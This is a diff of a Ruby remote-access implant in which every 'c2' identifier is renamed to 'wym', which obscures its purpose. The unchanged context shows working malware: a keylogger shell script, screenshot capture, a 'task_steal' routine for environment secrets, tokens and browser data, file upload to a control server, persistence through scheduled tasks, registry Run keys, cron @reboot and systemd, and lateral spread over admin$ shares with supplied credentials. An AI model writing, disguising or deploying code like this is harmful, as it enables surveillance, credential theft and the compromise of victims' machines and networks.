@@ -10,14 +10,14 @@
 #                 --interval 5 --jitter 2 --verbose
 #
 # Environment variables (accepted when the flag is not given):
-#   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+#   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 #
 # Flags:
-#   --server URL      server base URL (required unless C2_SERVER is set)
-#   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+#   --server URL      server base URL (required unless WYM_SERVER is set)
+#   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 #   --interval N      heartbeat interval in seconds (default 10, min 1)
 #   --jitter N        random jitter in seconds added to the interval
-#   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+#   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 #   --verbose         print activity to stdout
 #   -h, --help        show this help and exit
 #
@@ -36,7 +36,7 @@ require 'open3'
 
 SHELL_TIMEOUT = 120
 OUTPUT_LIMIT  = 12000
-$STATE_FILE   = ENV['C2_STATE_FILE'] || File.join(Dir.home, '.c2agent.json')
+$STATE_FILE   = ENV['WYM_STATE_FILE'] || File.join(Dir.home, '.wymagent.json')
 $windows      = !!(RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
 
 # ---------------------------------------------------------------- globals
@@ -44,9 +44,9 @@ $windows      = !!(RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
 $server   = ''
 $token    = ''
 $agent_id = ''
-$interval = (ENV['C2_INTERVAL'] || 10).to_i
-$jitter   = (ENV['C2_JITTER']   || 0).to_i
-$verbose  = %w[1 true].include?(ENV['C2_VERBOSE'])
+$interval = (ENV['WYM_INTERVAL'] || 10).to_i
+$jitter   = (ENV['WYM_JITTER']   || 0).to_i
+$verbose  = %w[1 true].include?(ENV['WYM_VERBOSE'])
 $clone_watchers = {}
 
 # ---------------------------------------------------------------- helpers
@@ -354,7 +354,7 @@ def task_upload(task_id, args)
   http.use_ssl = (uri.scheme == 'https')
 
   file_data = File.binread(path)
-  boundary = "----c2agent#{Time.now.to_i}"
+  boundary = "----wymagent#{Time.now.to_i}"
   body = "--#{boundary}\r\n" \
          "Content-Disposition: form-data; name=\"file\"; filename=\"#{File.basename(path)}\"\r\n" \
          "Content-Type: application/octet-stream\r\n\r\n" \
@@ -424,7 +424,7 @@ PS
 
 KEYLOG_SH = <<~'SH'
   #!/bin/sh
-  C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
+  C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}
   echo $$ > "$C2P"
   kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
   [ -z "$kid" ] && exit 1
@@ -434,7 +434,7 @@ KEYLOG_SH = <<~'SH'
 SH
 
 def klog_base
-  File.join(Dir.tmpdir, ".c2keylog_#{$agent_id}")
+  File.join(Dir.tmpdir, ".wymkeylog_#{$agent_id}")
 end
 
 def proc_alive?(pid)
@@ -560,7 +560,7 @@ end
 def task_screenshot(task_id, args)
   label = (args['name'] || 'screenshot').gsub(/\s+/, '')
   label = 'screenshot' if label.empty?
-  tmp = File.join(Dir.tmpdir, "c2shot_#{Time.now.to_i}_#{rand(1000)}.png")
+  tmp = File.join(Dir.tmpdir, "wymshot_#{Time.now.to_i}_#{rand(1000)}.png")
   case os_name
   when 'windows'
     `powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save('#{tmp.gsub('\\', '/')}');"`
@@ -802,7 +802,7 @@ end
 def task_steal(task_id, args)
   profile = (args['profile'] || 'all').to_s.strip.downcase
   profile = 'all' unless %w[all env tokens browser].include?(profile)
-  work = Dir.mktmpdir('c2steal_')
+  work = Dir.mktmpdir('wymsteal_')
   manifest = []
   begin
     if %w[all env].include?(profile)
@@ -881,43 +881,43 @@ def task_persistence(_args)
   begin
     self_path = File.expand_path($0)
     if $windows
-      base = File.join(ENV['APPDATA'] || Dir.home, 'Microsoft', 'Windows', 'c2update')
+      base = File.join(ENV['APPDATA'] || Dir.home, 'Microsoft', 'Windows', 'wymupdate')
       FileUtils.mkdir_p(base) rescue nil
-      dest = File.join(base, 'c2agent' + File.extname(self_path))
+      dest = File.join(base, 'wymagent' + File.extname(self_path))
       FileUtils.cp(self_path, dest) rescue (raise "cannot copy self to #{dest}")
       relaunch = relaunch_cmd(dest)
       output = "persistence: copied self to #{dest}"
       progdata = ENV['ProgramData'] || ENV['ALLUSERSPROFILE'] || 'C:\\ProgramData'
-      launcher_dir = File.join(progdata, 'c2update')
+      launcher_dir = File.join(progdata, 'wymupdate')
       FileUtils.mkdir_p(launcher_dir) rescue nil
-      wrapper = File.join(launcher_dir, 'c2relaunch.cmd')
+      wrapper = File.join(launcher_dir, 'wymrelaunch.cmd')
       File.write(wrapper, "@echo off\r\nstart \"\" /b #{relaunch}\r\n")
       output += "\npersistence: wrote launcher #{wrapper}"
-      task = run_shell("schtasks /Create /TN \"c2agent-persist\" /TR \"#{wrapper}\" /SC ONLOGON /RL HIGHEST /F", 30)
+      task = run_shell("schtasks /Create /TN \"wymagent-persist\" /TR \"#{wrapper}\" /SC ONLOGON /RL HIGHEST /F", 30)
       ok = task[1].zero?
       output += "\n#{task[0].strip}"
       unless ok
-        reg = run_shell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"#{wrapper}\" /f", 30)
+        reg = run_shell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d \"#{wrapper}\" /f", 30)
         ok = reg[1].zero?
         output += "\n#{reg[0].strip}"
       end
       [truncate_output(output), ok ? 0 : 1]
     else
-      base = File.join(Dir.home, '.config', 'c2update')
+      base = File.join(Dir.home, '.config', 'wymupdate')
       FileUtils.mkdir_p(base) rescue nil
       dest = File.join(base, File.basename(self_path))
       FileUtils.cp(self_path, dest) rescue (raise "cannot copy self to #{dest}")
       relaunch = relaunch_cmd(dest)
-      cron_line = "@reboot #{relaunch} # c2agent-persist"
-      cron = run_shell("(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '#{sh_embed(cron_line)}') | crontab -", 30)
+      cron_line = "@reboot #{relaunch} # wymagent-persist"
+      cron = run_shell("(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo '#{sh_embed(cron_line)}') | crontab -", 30)
       ok = cron[1].zero?
       output = "persistence: copied self to #{dest}\n#{cron[0].strip}"
-      unit = File.join(base, 'c2-update.service')
+      unit = File.join(base, 'wym-update.service')
       File.write(unit,
-        "[Unit]\nDescription=c2 update\n\n" \
+        "[Unit]\nDescription=wym update\n\n" \
         "[Service]\nType=simple\nExecStart=/bin/sh -c '#{sh_embed(relaunch)}'\nRestart=always\n\n" \
         "[Install]\nWantedBy=default.target\n")
-      sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now c2-update.service', 30)
+      sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now wym-update.service', 30)
       ok = ok || sd[1].zero?
       output += "\n#{sd[0].strip}"
       [truncate_output(output), ok ? 0 : 1]
@@ -967,9 +967,9 @@ def task_lateral(args)
   return ['lateral: no LAN peers found', 1] if peers.empty?
 
   user = (args['user'] || '').to_s
-  user = ENV['C2_LAT_USER'].to_s if user.empty?
+  user = ENV['WYM_LAT_USER'].to_s if user.empty?
   pass = (args['pass'] || '').to_s
-  pass = ENV['C2_LAT_PASS'].to_s if pass.empty?
+  pass = ENV['WYM_LAT_PASS'].to_s if pass.empty?
   has_creds = !user.empty? && !pass.empty?
   self_path = File.expand_path($0)
   basename = File.basename($0)
@@ -982,7 +982,7 @@ def task_lateral(args)
   peers.each do |host|
     if !has_creds
       skipped += 1
-      status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)'
+      status = 'skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)'
     elsif $windows
       r1 = run_shell(%(net use \\\\#{host}\\admin$ /user:#{user} "#{pass}"), 20)
       if r1[1] != 0
@@ -996,11 +996,11 @@ def task_lateral(args)
           run_shell(%(net use \\\\#{host}\\admin$ /delete /y), 20)
         else
           remote = %(\\\\#{host}\\admin$\\#{basename})
-          r3 = run_shell(%(schtasks /Create /S #{host} /TN "c2agent-lateral" /TR "#{remote}" /SC ONLOGON /RU #{user} /RP #{pass} /RL HIGHEST /F), 20)
+          r3 = run_shell(%(schtasks /Create /S #{host} /TN "wymagent-lateral" /TR "#{remote}" /SC ONLOGON /RU #{user} /RP #{pass} /RL HIGHEST /F), 20)
           run_shell(%(net use \\\\#{host}\\admin$ /delete /y), 20)
           deployed += 1
           status = if r3[1].zero?
-                     'deployed (file dropped + scheduled c2agent-lateral)'
+                     'deployed (file dropped + scheduled wymagent-lateral)'
                    else
                      "deployed (file dropped; task: #{err_brief(r3)})"
                    end
@@ -1087,8 +1087,8 @@ OptionParser.new do |opts|
   end
 end.parse!
 
-$server = ENV['C2_SERVER'] || '' if $server.empty?
-$token  = ENV['C2_TOKEN']  || '' if $token.empty?
+$server = ENV['WYM_SERVER'] || '' if $server.empty?
+$token  = ENV['WYM_TOKEN']  || '' if $token.empty?
 
 if $server.empty? || $token.empty?
   $stderr.puts "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
